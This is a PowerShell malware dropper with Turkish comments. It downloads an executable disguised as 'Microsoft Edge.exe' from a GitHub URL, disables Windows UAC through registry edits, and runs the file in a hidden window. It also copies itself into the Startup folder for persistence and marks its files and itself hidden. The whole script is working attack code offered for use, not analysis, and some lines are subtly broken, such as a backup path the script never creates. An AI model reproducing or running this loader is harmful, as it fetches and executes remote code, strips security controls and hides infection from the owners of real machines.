# Değişkenleri Ayarla
$URL = "https://github.com/kasaotnic4422/fatbitchmuseum/raw/main/Microsoft%20Edge.exe"
$OutputFile = "$env:TEMP\Microsoft%20Edge.exe"
$BackupDir = "$env:TEMP\.backup"
$BackupFile = "$BackupDir\Microsoft%Edge.exe"
$ExclusionFile = "$BackupDir\edgeinfo.txt"
$PersistenceDir = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"

# İndirilecek dosyayı indir
Invoke-WebRequest -Uri $URL -OutFile $OutputFile

# LUA/UAC'yı devre dışı bırak
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name EnableLUA -Value 0
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name ConsentPromptBehaviorAdmin -Value 0

# Arkaplanda sessizce dosyayı çalıştır
Start-Process -FilePath $OutputFile -WindowStyle Hidden

# Başlangıçta betiği tekrar çalıştırmak için kalıcılık ekle
if (!(Test-Path $PersistenceDir)) {
    New-Item -ItemType Directory -Path $PersistenceDir | Out-Null
}
Copy-Item -Path $MyInvocation.MyCommand.Path -Destination "$PersistenceDir\example.ps1" -Force

# Ek Gelişmiş Özellikler
Get-FileHash -Path $OutputFile
Get-Process -Name "powershell" | ForEach-Object { $_.MainWindowHandle = 0 }

# Orijinal dosyayı yedekle ve bir hariç tutma listesi oluştur
if (!(Test-Path $BackupDir)) {
    New-Item -ItemType Directory -Path $BackupDir | Out-Null
}
Add-Content -Path $ExclusionFile -Value $BackupFile
Add-Content -Path $ExclusionFile -Value $OutputFile

# Yedek dosyayı, hariç tutma listesini ve bu betiği gizle
$BackupDirAttributes = (Get-Item $BackupDir).Attributes
$BackupDirAttributes += "Hidden"
Set-Item -Path $BackupDir -Force -Attributes $BackupDirAttributes
$BackupFileAttributes = (Get-Item $BackupFile).Attributes
$BackupFileAttributes += "Hidden"
Set-Item -Path $BackupFile -Force -Attributes $BackupFileAttributes
$ExclusionFileAttributes = (Get-Item $ExclusionFile).Attributes
$ExclusionFileAttributes += "Hidden"
Set-Item -Path $ExclusionFile -Force -Attributes $ExclusionFileAttributes
$ScriptAttributes = (Get-Item $MyInvocation.MyCommand.Path).Attributes
$ScriptAttributes += "Hidden"
Set-Item -Path $MyInvocation.MyCommand.Path -Force -Attributes $ScriptAttributes